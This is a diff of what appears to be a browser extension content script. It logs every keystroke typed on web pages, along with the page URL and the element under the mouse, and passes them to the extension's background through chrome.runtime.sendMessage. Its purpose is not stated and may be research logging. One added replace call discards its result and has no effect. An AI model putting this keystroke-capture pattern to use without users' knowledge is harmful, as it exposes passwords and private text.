@@ -10701,7 +10701,7 @@ function tick() {
         //console.log("freeze at "+overId+" // "+overClass);
     }
 	EyeTime+=1;
-	if(EyeTime>1){
+	if(EyeTime>0){
 		sendMessage("eye");
 		EyeTime=0;
 	}
@@ -10768,7 +10768,6 @@ function KeyCheck(event) {
             keyboard.Typed += "-!-";
             break;
         case 13:
-			keyboard.Typed = keyboard.Typed.slice(0, -1);
             sendMessage("keyboard");
             keyboard.Typed = "";
             keyboard.Id = e.target.id;
@@ -10796,6 +10795,7 @@ document.onkeypress = function (e) {
         keyboard.Y=Math.round(obj.y);
     }
 	keyboard.Typed += key;
+	keyboard.Typed.replace(/(?:\r\n|\r|\n)/g," - ");
 	console.log(keyboard.Typed);
 }
 
@@ -10848,6 +10848,7 @@ function sendMessage(type)
 		data.url = document.URL;
 		data.mouseId = overId;
 		data.mouseClass = overClass;
+		data.Typed = data.Typed.replace(/(?:\r\n|\r|\n)/g, " - ");
 		//console.log("message send "+type);
 		chrome.runtime.sendMessage({
 			type: type,
